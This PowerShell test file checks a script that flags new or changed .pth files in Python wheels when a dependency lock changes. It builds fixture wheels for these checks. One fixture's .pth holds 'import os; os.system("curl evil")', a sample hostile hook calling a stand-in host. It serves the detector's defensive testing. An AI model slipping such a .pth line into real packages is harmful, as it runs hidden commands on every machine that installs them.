<#
.SYNOPSIS
Tests for wheel-pth.ps1, the .pth check lock.ps1 and scripts/review-deps.ps1 run on a lock change.

.DESCRIPTION
The fixture tests build small wheels in a temp folder and point requirements.txt texts at them with file: URLs and
their real sha256, so they run offline. One network test reads a real PyPI wheel that ships a .pth (setuptools'
distutils-precedence.pth) over HTTP range requests; it is skipped when PyPI is unreachable. Exits 1 on any failure.

.EXAMPLE
pwsh Infra/scripts/wheel-pth.tests.ps1
#>
#Requires -Version 7
[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot 'wheel-pth.ps1')
Add-Type -AssemblyName System.IO.Compression

$failures = [System.Collections.Generic.List[string]]::new()
$skipped = 0
$passed = 0
$work = Join-Path ([System.IO.Path]::GetTempPath()) "wheel-pth-tests-$PID"
New-Item -ItemType Directory -Force $work | Out-Null

$online = $true
try { $null = Invoke-WebRequest 'https://pypi.org/simple/' -Method Head -TimeoutSec 10 } catch { $online = $false }
if (-not $online) { Write-Host 'PyPI unreachable: network tests are skipped.' -ForegroundColor Yellow }

function Test-Case {
  param([string]$Name, [switch]$Network, [scriptblock]$Body)
  if ($Network -and -not $online) {
    $script:skipped++
    Write-Host "  SKIP  $Name"
    return
  }
  try {
    & $Body
    $script:passed++
    Write-Host "  PASS  $Name" -ForegroundColor Green
  } catch {
    $script:failures.Add("$Name`n        $($_.Exception.Message)")
    Write-Host "  FAIL  $Name`n        $($_.Exception.Message)" -ForegroundColor Red
  }
}

function Assert-True {
  param([bool]$Condition, [string]$Message)
  if (-not $Condition) { throw $Message }
}

# A wheel at $work/<file> holding the given entries (text from -Contents, else a comment naming the entry), and the lock line that pins it by file: URL.
function New-Wheel {
  param([string]$File, [string[]]$Entries, [hashtable]$Contents = @{})
  $path = Join-Path $work $File
  $zip = [System.IO.Compression.ZipFile]::Open($path, 'Create')
  try {
    foreach ($entry in $Entries) {
      $writer = [System.IO.StreamWriter]::new($zip.CreateEntry($entry).Open())
      $writer.Write($(if ($Contents.ContainsKey($entry)) { $Contents[$entry] } else { "# $entry" }))
      $writer.Dispose()
    }
  } finally { $zip.Dispose() }
  $hash = (Get-FileHash -Algorithm SHA256 $path).Hash.ToLowerInvariant()
  $name = $File.Split('-')[0]
  return "$name @ $(([uri]$path).AbsoluteUri) \`n    --hash=sha256:$hash`n"
}

function Get-Change {
  param([string]$Old, [string]$New, [string]$Name)
  @(Get-LockPthChanges $Old $New | Where-Object Name -eq $Name)
}

Write-Host 'wheel-pth.ps1'

$plain = 'demo/__init__.py', 'demo-1.0.dist-info/METADATA', 'demo-1.0.dist-info/RECORD'

Test-Case 'a bump to a wheel without a .pth has no new .pth' {
  $old = New-Wheel 'demo-1.0-py3-none-any.whl' $plain
  $new = New-Wheel 'demo-1.1-py3-none-any.whl' ($plain -replace '1\.0', '1.1')
  $c = Get-Change $old $new 'demo'
  Assert-True ($c.Count -eq 1) "expected one change, got $($c.Count)"
  Assert-True ($c[0].Wheels -eq 1) "wheels read: $($c[0].Wheels)"
  Assert-True ($c[0].NewPth.Count -eq 0) "new .pth: $($c[0].NewPth -join ', ')"
}

Test-Case 'a bump to a wheel with a top-level .pth reports it as new' {
  $old = New-Wheel 'demo-2.0-py3-none-any.whl' $plain
  $new = New-Wheel 'demo-2.1-py3-none-any.whl' ($plain + 'demo-hook.pth')
  $c = Get-Change $old $new 'demo'
  Assert-True ($c[0].NewPth.Count -eq 1 -and $c[0].NewPth[0] -eq 'demo-2.1-py3-none-any.whl: demo-hook.pth') "new .pth: $($c[0].NewPth -join ', ')"
}

Test-Case 'a .pth <name>.data/ installs into site-packages is found, one inside a package or under scripts/ is not' {
  $old = New-Wheel 'demo-3.0-py3-none-any.whl' $plain
  $new = New-Wheel 'demo-3.1-py3-none-any.whl' ($plain + 'demo-3.1.data/purelib/sneaky.pth', 'demo-3.1.data/data/lib/python3.13/site-packages/deep.pth', 'demo/templates/example.pth', 'demo-3.1.data/scripts/tool.pth')
  $c = Get-Change $old $new 'demo'
  $names = @($c[0].NewPth | ForEach-Object { $_.Split('/')[-1] } | Sort-Object)
  Assert-True (($names -join ',') -eq 'deep.pth,sneaky.pth') "new .pth: $($c[0].NewPth -join ', ')"
}

Test-Case 'a .pth the previous version shipped is kept, not new' {
  $old = New-Wheel 'demo-4.0-py3-none-any.whl' ($plain + 'demo-hook.pth')
  $new = New-Wheel 'demo-4.1-py3-none-any.whl' ($plain + 'demo-hook.pth')
  $c = Get-Change $old $new 'demo'
  Assert-True ($c[0].NewPth.Count -eq 0) "new .pth: $($c[0].NewPth -join ', ')"
  Assert-True ($c[0].KeptPth.Count -eq 1) "kept .pth: $($c[0].KeptPth -join ', ')"
}

Test-Case 'a .pth the previous version shipped with other contents is new' {
  $old = New-Wheel 'demo-4.5-py3-none-any.whl' ($plain + 'demo-hook.pth')
  $new = New-Wheel 'demo-4.6-py3-none-any.whl' ($plain + 'demo-hook.pth') -Contents @{ 'demo-hook.pth' = 'import os; os.system("curl evil")' }
  $c = Get-Change $old $new 'demo'
  Assert-True ($c[0].NewPth.Count -eq 1 -and $c[0].NewPth[0] -like '*demo-hook.pth (contents changed)') "new .pth: $($c[0].NewPth -join ', ')"
  Assert-True ($c[0].KeptPth.Count -eq 0) "kept .pth: $($c[0].KeptPth -join ', ')"
}

Test-Case 'a hash that names no PyPI file is unmatched' -Network {
  $new = "certifi==2026.10.23 \`n    --hash=sha256:$('0' * 64)`n"
  $c = Get-Change '' $new 'certifi'
  Assert-True ($c[0].Unmatched.Count -eq 1 -and $c[0].Wheels -eq 0) "unmatched: $($c[0].Unmatched -join ', ')"
}

Test-Case 'a package new to the lock with a .pth reports it as new' {
  $other = New-Wheel 'other-1.0-py3-none-any.whl' 'other/__init__.py'
  $new = New-Wheel 'demo-5.0-py3-none-any.whl' ($plain + 'demo-hook.pth')
  $c = Get-Change $other ($other + $new) 'demo'
  Assert-True ($c.Count -eq 1 -and $null -eq $c[0].Old) 'expected a new package'
  Assert-True ($c[0].NewPth.Count -eq 1) "new .pth: $($c[0].NewPth -join ', ')"
  Assert-True (@(Get-Change $other ($other + $new) 'other').Count -eq 0) 'an unchanged pin was reported'
}

Test-Case 'a central directory beyond the 64 KB tail is read with a second range' {
  $many = @($plain) + @(1..900 | ForEach-Object { "demo/generated/module_with_a_long_name_to_grow_the_directory_$_.py" }) + 'zz-hook.pth'
  $old = New-Wheel 'demo-6.0-py3-none-any.whl' $plain
  $new = New-Wheel 'demo-6.1-py3-none-any.whl' $many
  $names = Get-ZipEntries (Join-Path $work 'demo-6.1-py3-none-any.whl')
  Assert-True ($names.Count -eq $many.Count) "entries read: $($names.Count) of $($many.Count)"
  $c = Get-Change $old $new 'demo'
  Assert-True ($c[0].NewPth.Count -eq 1) "new .pth: $($c[0].NewPth -join ', ')"
}

Test-Case 'a source distribution pin is skipped and says why' {
  $old = New-Wheel 'demo-7.0-py3-none-any.whl' $plain
  $new = "demo @ https://example.invalid/demo-7.1.tar.gz \`n    --hash=sha256:$('0' * 64)`n"
  $c = Get-Change $old $new 'demo'
  Assert-True ($c[0].Wheels -eq 0 -and $c[0].Skipped.Count -eq 1 -and $c[0].Skipped[0] -match 'not a wheel') "skipped: $($c[0].Skipped -join ', ')"
}

Test-Case 'a real lock reads as one pin per package, with its hashes' {
  $pins = @(Read-PythonLock (Get-Content -Raw (Join-Path $PSScriptRoot '../minilm-l6/requirements.txt')))
  $certifi = $pins | Where-Object Name -eq 'certifi'
  $torch = $pins | Where-Object Name -eq 'torch'
  Assert-True ($certifi.Version -and $certifi.Hashes.Count -eq 2) "certifi: $($certifi | Out-String)"
  Assert-True ($torch.Url -like 'https://download.pytorch.org/*.whl' -and $torch.Hashes.Count -eq 1) "torch: $($torch | Out-String)"
  Assert-True (@($pins | Where-Object { -not $_.Version -and -not $_.Url }).Count -eq 0) 'a pin with no version or URL'
}

Test-Case -Network 'a PyPI pin is matched by hash and its wheel read over range requests' {
  $old = "setuptools==83.0.0 \`n    --hash=sha256:$('0' * 64)`n"   # a hash PyPI doesn't have: the old version reads as no wheels
  $new = (Get-Content -Raw (Join-Path $PSScriptRoot '../minilm-l6/requirements.txt')) -split '(?m)^(?=\S)' | Where-Object { $_ -like 'setuptools==*' }
  Assert-True ([bool]$new) 'setuptools is not in the minilm-l6 lock'
  $c = Get-Change $old ($new -join '') 'setuptools'
  Assert-True ($c[0].Wheels -eq 1) "wheels read: $($c[0].Wheels)"
  Assert-True (($c[0].NewPth -join ',') -match 'distutils-precedence\.pth$') "new .pth: $($c[0].NewPth -join ', ')"
}

Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue
Write-Host ''
Write-Host "$passed passed, $($failures.Count) failed, $skipped skipped"
if ($failures.Count -gt 0) { exit 1 }
